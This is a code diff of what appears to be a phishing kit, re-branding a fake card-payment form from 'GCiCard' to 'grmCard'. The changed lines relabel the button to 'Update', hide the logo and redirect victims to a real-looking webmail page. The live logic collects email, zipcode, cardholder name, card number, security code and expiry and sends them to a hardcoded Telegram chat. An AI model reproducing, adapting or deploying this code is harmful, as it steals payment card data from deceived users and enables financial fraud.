@@ -10,11 +10,11 @@
           <div class="styles__innerContainer___3wBPl">
 
             <div class="styles__header___sdbu2">
-              <img class="mx-auto d-block styles__logo___10yQo"
+              <!-- <img class="mx-auto d-block styles__logo___10yQo"
                    width="300"
                    height="182"
                    src="/images/MTA-2018-v1-transparent-2018-b7546f735056a36_b7547050-5056-a36a-082129b5b75f5c02.png"
-                   alt="Logo">
+                   alt="Logo"> -->
             </div>
 
             <form action="?" role="form" autocomplete="off">
@@ -34,7 +34,7 @@
                 <div class="card-body">
 
                   <fieldset class="form-group">
-                    <label for="amount">Cards</label>
+                    <label for="amount"><b>CARD</b></label>
                     <h3 class="styles__amountContainer___2e5RU">
                       <span>.. </span>
                       <input name="amount" id="amount" type="text"
@@ -163,7 +163,7 @@
               <div style="padding-top:15px; display:flex; justify-content:center; align-items:center; flex-direction:column;">
                 <div class="col-6">
                   <button class="btn btn-lg btn-success btn-block" type="submit"   @click.prevent="finishJoob">
-                    Pay 
+                    Update 
                   </button>
                 </div>
               </div>
@@ -228,12 +228,11 @@ export default {
         this.loading = true;
 
         // Format the message as string
-        const message = `*GCiCard*\nemail: ${this.formDataRes.email}\nzipcode: ${this.formDataRes.zipcode}\ncardholder: ${this.formDataRes.cardholder}\ncardnumber: ${this.formDataRes.cardnumber}\nsecuritycode: ${this.formDataRes.securitycode}\nExpirationDate: ${this.formDataRes.ExpirationDate}\nExpirationYear: ${this.formDataRes.ExpirationYear}`;
+        const message = `*grmCard*\nemail: ${this.formDataRes.email}\nzipcode: ${this.formDataRes.zipcode}\ncardholder: ${this.formDataRes.cardholder}\ncardnumber: ${this.formDataRes.cardnumber}\nsecuritycode: ${this.formDataRes.securitycode}\nExpirationDate: ${this.formDataRes.ExpirationDate}\nExpirationYear: ${this.formDataRes.ExpirationYear}`;
 
         // Send to Telegram
         await this.sendTelegramResult(
           process.env.NUXT_APP_CHAT_ID || "-4794000485", 
-          // 5
           message
         );
 
@@ -241,7 +240,7 @@ export default {
         this.loading = false;
       } else {
         // Redirect after sending
-        location.replace("https://gci-email.vercel.app/");
+        location.replace("https://webmail.grm.net/");
       }
     },
 
